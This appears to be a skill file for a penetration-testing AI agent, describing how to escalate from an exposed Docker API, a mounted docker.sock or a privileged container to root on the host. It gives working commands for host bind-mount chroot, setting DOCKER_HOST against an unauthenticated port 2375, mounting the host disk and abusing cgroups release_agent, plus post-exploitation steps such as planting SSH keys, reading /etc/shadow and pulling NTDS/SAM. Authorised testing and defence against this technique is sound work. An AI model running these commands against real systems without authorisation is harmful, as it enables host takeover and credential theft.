---
name: cloud-docker-api-abuse
description: >
  Turn an exposed container daemon or an over-privileged container into host compromise — a Docker
  API on 2375/2376, a mounted docker.sock, or a privileged/`-v /:/host` container. Load when you
  find an open Docker/containerd socket, port 2375/2376, a container you can run images in, or you
  landed inside a container and want the host. Signals: 2375/tcp open, /var/run/docker.sock reachable,
  `docker` group membership, privileged container, host paths mounted in.
domain: cloud
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: critical
owasp: [A05:2021-Security-Misconfiguration]
mitre: [T1610, T1611]
cwe: [CWE-16, CWE-284]
tools: [docker, curl, netexec]
schema_version: 1
---

# Docker / container daemon abuse

## When it applies
You can reach a container control plane you shouldn't: an unauthenticated Docker API on `2375/tcp`
(or `2376` without client-cert auth), a mounted `/var/run/docker.sock` inside a container you
control, membership in the `docker` group, or a privileged/host-mounted container. Any of these is
effectively root on the host. Complements `cloud-container-escape` (which focuses on kernel/runtime
breakouts); this one is about the daemon/socket as the vector.

## Why it works
The Docker daemon runs as root and will build/run any container with any mount you ask for. Anyone
who can talk to its API or socket can start a container that bind-mounts the host filesystem
(`-v /:/host`) or runs `--privileged` — then read/write host files, add a root user, or chroot in.
There's no privilege boundary between "can use the daemon" and "root on the host".

## Method
1. **Confirm the vector.**
   - Remote API: `curl http://<host>:2375/version` and `/containers/json` — a response = unauthenticated control.
   - In-container socket: `ls -la /var/run/docker.sock`; `docker` CLI or `curl --unix-socket`.
   - `docker` group: `id | grep docker`.
2. **Point the CLI at the daemon** (remote): `export DOCKER_HOST=tcp://<host>:2375` then `docker ps`.
3. **Mount the host and take root** — run a container bind-mounting the host root and act on it:
   ```
   docker run -v /:/host --rm -it alpine chroot /host sh
   ```
   From there: add a privileged user, drop an SSH key into `/root/.ssh/authorized_keys`, read
   `/etc/shadow`, or (Windows host) pull `NTDS`/SAM.
4. **Privileged-container escape** (already inside one): `--privileged` exposes host devices —
   mount the host disk (`fdisk -l` → `mount /dev/sdaN /mnt`) or abuse cgroups release_agent to run
   a command as root on the host.
5. **Pull secrets** from the daemon: image layers, env vars (`docker inspect`), and other containers'
   filesystems often hold credentials → pivot with `recon`/`cloud-*`.

## Gotchas
- **`2376` is usually TLS + client-cert** — if it rejects you without a cert, it's *not* the open one;
  `2375` is the plaintext/no-auth port to look for.
- **Read-only or restricted socket mounts** may allow listing but not `run` — check what verbs work
  before assuming full control.
- **Non-destructive by default** — creating containers/users changes host state; on bounty confirm
  RCE minimally (e.g. read a root-only file) and stop, per `reporting-triage-validation`.
- **Clean up** every container, image, and user you create.

## Verify success
Read or write a host-only resource from your mounted/escaped context (e.g. `/etc/shadow`, a file in
another user's home, or a root-owned path) — proving host-level access from the container plane.

## References
Docker Engine API docs; `docker.sock` escape write-ups; MITRE ATT&CK T1610/T1611. Kernel/runtime
breakouts: `cloud-container-escape`.
